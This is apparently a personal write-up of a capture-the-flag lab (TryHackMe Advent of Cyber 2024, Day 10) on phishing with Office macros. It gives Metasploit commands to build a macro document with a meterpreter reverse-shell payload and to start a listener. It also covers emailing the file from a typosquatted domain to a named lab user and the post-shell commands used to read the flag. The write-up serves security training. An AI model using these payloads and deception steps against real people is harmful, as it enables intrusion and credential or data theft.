# Phishing Day 10: He had a brain full of macros, and had shells in his soul.

## Learning Objectives
- Understand how phishing attacks work
- Discover how macros in documents can be used and abused
- Learn how to carry out a phishing attack with a macro


1. Create the payload (malicious document) using Metasploit Framework
   - use your Kali attackbox IP as the local host IP address (LHOST)

```
msfconsole 
set payload windows/meterpreter/reverse_tcp
use exploit/multi/fileformat/office_word_macro
set LHOST x.x.x.x
set LPORT port#
```


<img src="https://raw.githubusercontent.com/Nisha318/Nisha318.github.io/master/assets/images/thm/advent-of-cyber/2024/day10-1.png" alt="day10-1"><br>





<img src="https://raw.githubusercontent.com/Nisha318/Nisha318.github.io/master/assets/images/thm/advent-of-cyber/2024/day10-2.png" alt="day10-2"><br>


<img src="https://raw.githubusercontent.com/Nisha318/Nisha318.github.io/master/assets/images/thm/advent-of-cyber/2024/day10-3.png" alt="day10-3"><br>

	2. Listening for Incoming Connections (terminal 2)

  In a new terminal tab:

```
msfconsole

use multi/handler

set payload windows/meterpreter/reverse_tcp

set LHOST x.x.x.x

set LPORT port#

show options

exploit 
```

<img src="https://raw.githubusercontent.com/Nisha318/Nisha318.github.io/master/assets/images/thm/advent-of-cyber/2024/day10-4.png" alt="day10-4"><br>


<img src="https://raw.githubusercontent.com/Nisha318/Nisha318.github.io/master/assets/images/thm/advent-of-cyber/2024/day10-5.png" alt="day10-5"><br>


<img src="https://raw.githubusercontent.com/Nisha318/Nisha318.github.io/master/assets/images/thm/advent-of-cyber/2024/day10-6.png" alt="day10-6"><br>


3. Email the Malicious Document (using typosquatting technique)

My email sender app was located at:
http://10.10.240.185/mail/


<img src="https://raw.githubusercontent.com/Nisha318/Nisha318.github.io/master/assets/images/thm/advent-of-cyber/2024/day10-7.png" alt="day10-7"><br>


<img src="https://raw.githubusercontent.com/Nisha318/Nisha318.github.io/master/assets/images/thm/advent-of-cyber/2024/day10-8.png" alt="day10-8"><br>

Attach the payload:
 Navigate to: root > .msf4 > local > msf.docm > open

 
<img src="https://raw.githubusercontent.com/Nisha318/Nisha318.github.io/master/assets/images/thm/advent-of-cyber/2024/day10-9.png" alt="day10-9"><br>
<img src="https://raw.githubusercontent.com/Nisha318/Nisha318.github.io/master/assets/images/thm/advent-of-cyber/2024/day10-10.png" alt="day10-10"><br>

Address an email to the target user, marta@socmas.thm, convincing her to open the malicious file attachment.  The sender's email domain is a deliberate typo used to trick the receiver:

<img src="https://raw.githubusercontent.com/Nisha318/Nisha318.github.io/master/assets/images/thm/advent-of-cyber/2024/day10-11.png" alt="day10-11"><br>


Marta responded by acknowledging the message and advised that she would check the document immediately. 

<img src="https://raw.githubusercontent.com/Nisha318/Nisha318.github.io/master/assets/images/thm/advent-of-cyber/2024/day10-12.png" alt="day10-12"><br>

## Exploitation

Marta's action triggers the execution of the payload, which initiates a reverse shell connection back to my attacker machine IP address to its listening port:


<img src="https://raw.githubusercontent.com/Nisha318/Nisha318.github.io/master/assets/images/thm/advent-of-cyber/2024/day10-13.png" alt="day10-13"><br>

```
shell
whoami
cd c:/users/Administrator/Desktop
dir
type flag.txt
```

<img src="https://raw.githubusercontent.com/Nisha318/Nisha318.github.io/master/assets/images/thm/advent-of-cyber/2024/day10-14.png" alt="day10-14"><br>
<img src="https://raw.githubusercontent.com/Nisha318/Nisha318.github.io/master/assets/images/thm/advent-of-cyber/2024/day10-15.png" alt="day10-15"><br>


